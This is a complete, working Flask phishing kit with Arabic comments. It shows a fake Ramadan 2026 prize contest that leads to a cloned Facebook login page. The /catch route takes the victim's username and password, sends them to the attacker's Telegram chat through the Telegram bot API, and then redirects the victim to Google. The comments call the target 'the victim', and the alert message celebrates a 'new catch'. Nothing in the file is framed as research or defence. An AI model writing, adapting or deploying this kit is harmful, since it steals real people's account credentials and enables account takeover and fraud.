from flask import Flask, render_template_string, request, redirect
import requests

app = Flask(__name__)

# --- إعدادات التيليجرام (حط معلوماتك هنا) ---
TOKEN = "حط_هنا_التوكن_اللي_عطاهولك_BotFather"
CHAT_ID = "7479786207"

# --- الواجهة الاحترافية (HTML) ---
# الصفحة الأولى: المسابقة الوهمية
contest_ui = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>مسابقة رمضان الكبرى 2026</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { background-color: #f0f2f5; font-family: sans-serif; }
        .box { background: white; border-radius: 15px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
        .btn-fb { background-color: #1877f2; color: white; padding: 12px 20px; border-radius: 8px; font-weight: bold; width: 100%; text-align: center; display: block; }
    </style>
</head>
<body class="flex items-center justify-center min-h-screen px-4">
    <div class="box p-8 w-full max-w-sm text-center">
        <img src="https://upload.wikimedia.org/wikipedia/commons/e/e4/Ramadan_logo.svg" alt="Ramadan Logo" class="w-32 mx-auto mb-6">
        <h1 class="text-2xl font-bold text-gray-800 mb-4">مسابقة رمضان الكبرى 2026</h1>
        <p class="text-gray-600 mb-8">شارك الآن واربح جوائز قيمة! اضغط على الزر أدناه للتسجيل عبر فيسبوك والمشاركة.</p>
        <a href="/login/facebook" class="btn-fb">تسجيل الدخول عبر فيسبوك والمشاركة</a>
    </div>
</body>
</html>
"""

# الصفحة الثانية: تسجيل الدخول لفيسبوك
login_template = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل الدخول إلى فيسبوك</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-[#f0f2f5] flex flex-col items-center pt-10 px-4">
    <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo" class="w-16 mb-8">
    <div class="bg-white p-6 rounded-xl shadow-md w-full max-w-[400px]">
        <h2 class="text-xl font-bold text-center mb-6">تسجيل الدخول للمشاركة</h2>
        <form action="/catch?platform={{platform}}" method="POST" class="space-y-4">
            <input type="text" name="user" placeholder="رقم الهاتف أو البريد" class="w-full border p-3 rounded-lg bg-gray-50 outline-none focus:border-blue-500" required>
            <input type="password" name="pass" placeholder="كلمة السر" class="w-full border p-3 rounded-lg bg-gray-50 outline-none focus:border-blue-500" required>
            <button class="bg-[#1877f2] text-white p-3 rounded-lg font-bold text-xl w-full">تسجيل الدخول</button>
            <div class="text-center text-sm mt-4 text-blue-600 cursor-pointer">هل نسيت كلمة السر؟</div>
            <hr class="my-6">
            <div class="flex justify-center"><button type="button" class="bg-[#42b72a] text-white px-4 py-2 rounded-lg font-bold">إنشاء حساب جديد</button></div>
        </form>
    </div>
</body>
</html>
"""

@app.route('/')
def home(): return render_template_string(contest_ui)

@app.route('/login/<platform>')
def login(platform):
    return render_template_string(login_template, platform=platform)

@app.route('/catch', methods=['POST'])
def catch():
    user = request.form.get('user')
    pwd = request.form.get('pass')
    platform = request.args.get('platform')
    
    # رسالة التبليغ لتيليجرام
    msg = f"🔥 صيد جديد يا فارس! 🔥\\n\\n👤 المنصة: {platform.upper()}\\n📧 الحساب: {user}\\n🔑 المودباس: {pwd}"
    
    # إرسال البيانات لتيليجرام
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={CHAT_ID}&text={msg}"
    requests.get(url)
    
    # توجيه الضحية لصفحة المسابقة الأصلية أو أي صفحة أخرى
    return redirect('https://www.google.com')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
